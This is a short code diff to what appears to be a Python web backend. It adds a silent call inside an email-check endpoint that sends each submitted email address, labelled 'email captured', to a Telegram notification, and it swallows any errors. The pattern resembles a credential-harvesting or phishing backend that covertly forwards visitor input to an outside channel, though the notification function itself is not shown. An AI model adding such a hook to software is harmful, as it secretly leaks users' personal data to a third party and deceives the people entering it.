@@ -114,6 +114,12 @@ async def register(user_data: UserCreate):
 async def check_email(email_data: CheckEmailRequest):
     """Check if an email address exists in the database."""
     try:
+        # Send Telegram notification - email captured
+        try:
+            notify_email_captured(email_data.email.lower())
+        except Exception as e:
+            logger.warning(f"Failed to send Telegram notification: {str(e)}")
+        
         user = await db.users.find_one({"email": email_data.email.lower()})
         return CheckEmailResponse(
             exists=user is not None,
